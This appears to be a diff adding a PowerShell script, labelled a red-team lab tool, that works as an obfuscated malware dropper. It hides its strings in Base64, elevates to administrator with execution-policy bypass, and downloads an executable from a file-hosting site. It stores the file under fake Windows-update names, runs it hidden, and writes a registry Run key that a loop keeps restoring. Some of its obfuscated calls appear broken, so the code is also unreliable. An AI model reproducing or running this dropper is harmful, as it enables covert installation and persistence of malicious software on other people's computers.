@@ -1,0 +1,77 @@
+# Obfuscated PowerShell Red-Team Script (Lab Use Only)
+
+# Helper function to decode Base64 strings
+function Decode-Base64([string]$b64) {
+    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+}
+
+# Obfuscated strings (Base64 encoded)
+$adminCheckClass = "U3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHk=" # System.Security.Principal.WindowsIdentity
+$adminCheckRole = "U3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGU=" # System.Security.Principal.WindowsBuiltInRole
+$adminRoleName = "QWRtaW5pc3RyYXRvcg==" # Administrator
+$invokeWebReq = "SW52b2tlLVdlYlJlcXVlc3Q=" # Invoke-WebRequest
+$startProc = "U3RhcnQtUHJvY2Vzcw==" # Start-Process
+$setItemProp = "U2V0LUl0ZW1Qcm9wZXJ0eQ==" # Set-ItemProperty
+$testPath = "VGVzdC1QYXRo" # Test-Path
+
+# Decode strings
+$winIdentityClass = Decode-Base64 $adminCheckClass
+$winRoleClass = Decode-Base64 $adminCheckRole
+$adminRole = [Enum]::Parse([Type]::GetType($winRoleClass), (Decode-Base64 $adminRoleName))
+
+# Function to check admin privileges
+function Check-Admin {
+    $currentUser = [Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null; # Slightly obfuscated load
+    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object System.Security.Principal.WindowsPrincipal($id)
+    return $principal.IsInRole($adminRole)
+}
+
+if (-not (Check-Admin)) {
+    Write-Host "Script ko admin privileges me run karo!"
+    # Relaunch with admin using obfuscated command
+    $args = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    (& ([ScriptBlock]::Create($startProc))) powershell -ArgumentList $args -Verb RunAs
+    exit
+}
+
+# Encoded URL and paths
+$exeUrl = Decode-Base64 "aHR0cHM6Ly90bXBmaWxlcy5vcmcvZGwvMjM2MTQwNzUvc29mdHdhcmUuZXhl" # https://tmpfiles.org/dl/23614075/software.exe
+$exePath = "$env:ProgramData\system_update.exe"
+$backupPath = "$env:AppData\WindowsUpdate.exe"
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$exeName = "MySoftware"
+
+# Download with retry
+$maxRetries = 5
+$retryDelay = 5
+
+for ($i=1; $i -le $maxRetries; $i++) {
+    try {
+        (& ([ScriptBlock]::Create($invokeWebReq))) -Uri $exeUrl -OutFile $exePath
+        Write-Host "Download successful!"
+        break
+    } catch {
+        Write-Host "Download failed! Retrying in $retryDelay seconds... ($i/$maxRetries)"
+        Start-Sleep -Seconds $retryDelay
+    }
+}
+
+# Copy exe to backup location
+Copy-Item -Path $exePath -Destination $backupPath -Force
+
+# Hidden execution
+(& ([ScriptBlock]::Create($startProc))) -FilePath $exePath -WindowStyle Hidden -NoNewWindow
+
+# Persistence in registry
+(& ([ScriptBlock]::Create($setItemProp))) -Path $regPath -Name $exeName -Value $exePath
+
+# Monitor persistence in registry
+while ($true) {
+    if (-not (& ([ScriptBlock]::Create($testPath))) "$regPath\$exeName") {
+        (& ([ScriptBlock]::Create($setItemProp))) -Path $regPath -Name $exeName -Value $exePath
+    }
+    Start-Sleep -Seconds 10
+}
+
+Write-Host "Software installed aur startup me add ho gaya!"
